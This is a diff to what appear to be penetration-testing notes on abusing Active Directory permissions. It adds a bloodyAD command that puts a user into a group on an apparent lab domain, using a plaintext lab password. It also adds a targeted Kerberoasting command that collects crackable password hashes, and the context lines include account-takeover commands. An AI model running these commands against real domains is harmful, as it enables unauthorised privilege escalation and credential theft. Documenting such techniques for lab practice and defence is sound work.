@@ -6,6 +6,10 @@
 
 Shows security groups that a user can add themselves to.
 
+```shell
+bloodyAD --host 10.129.186.179 -d 'tombwatcher.htb' -u 'alfred' -p 'basketball' add groupMember 'infrastructure' 'alfred'
+```
+
 ### ForceChangePassword
 
     Abused with Set-DomainUserPassword
@@ -99,3 +103,17 @@ Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity <user_that_is_gonna_rec
     dacledit.py -action 'write' -rights 'FullControl' -principal '<username_of_new_owner>' -target '<username_being_owned>' '<domain_name>'/'<username_new_owner>':'<password_new_owner>' # to give full control
 
 https://github.com/Andre92Marcos/tools/tree/master/bloodyAD
+
+
+### WriteSPN
+
+A targeted kerberoast attack can be performed using targetedKerberoast.py: https://github.com/ShutdownRepo/targetedKerberoast
+
+
+```shell
+targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword'
+```
+
+The tool will automatically attempt a targetedKerberoast attack, either on all users or against a specific one if specified in the command line, and then obtain a crackable hash. The cleanup is done automatically as well.
+
+The recovered hash can be cracked offline using the tool of your choice.
